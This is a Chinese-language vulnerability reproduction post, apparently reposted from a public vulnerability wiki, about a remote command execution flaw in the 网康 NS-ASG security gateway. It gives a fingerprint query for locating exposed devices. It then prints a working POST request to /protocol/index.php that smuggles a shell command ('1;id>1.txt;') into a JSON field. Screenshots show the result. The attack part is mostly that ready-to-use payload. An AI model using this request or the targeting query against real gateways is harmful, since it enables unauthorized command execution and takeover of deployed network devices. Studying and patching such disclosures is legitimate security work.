---
title: "网康 NS-ASG安全网关 index.php 远程命令执行漏洞"
date: 2026-10-18 09:16:38
categories:
  - WebSecurity
  - CVE
  - "IoT"
  - "网康"
tags:
  - "网康"
  - "命令执行"
  - "任意文件读取"
  - "漏洞复现"
---
## 漏洞描述

网康 NS-ASG安全网关 index.php文件存在远程命令执行漏洞，攻击者通过构造特殊的请求包可以获取服务器权限

## 漏洞影响

```
网康 NS-ASG安全网关
```

## 网络测绘

```
title=="网康 NS-ASG 应用安全网关"
```

## 漏洞复现

登录页面

![image-20230314085700163](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/image-20230314085700163.png)

存在漏洞的文件为 /protocol/index.php ，通过文件读取可以获取到源码

![image-20230314085713446](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/image-20230314085713446.png)

![image-20230314085722233](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/image-20230314085722233.png)

通过构造请求包进行命令拼接漏洞执行命令

```
POST /protocol/index.php
  
jsoncontent={"protocolType":"getsysdatetime","messagecontent":"1;id>1.txt;"}
```

![image-20230314085737042](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/image-20230314085737042.png)

![image-20230314085745134](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/image-20230314085745134.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/iot/%E7%BD%91%E5%BA%B7-NS-ASG%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3-index.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md)
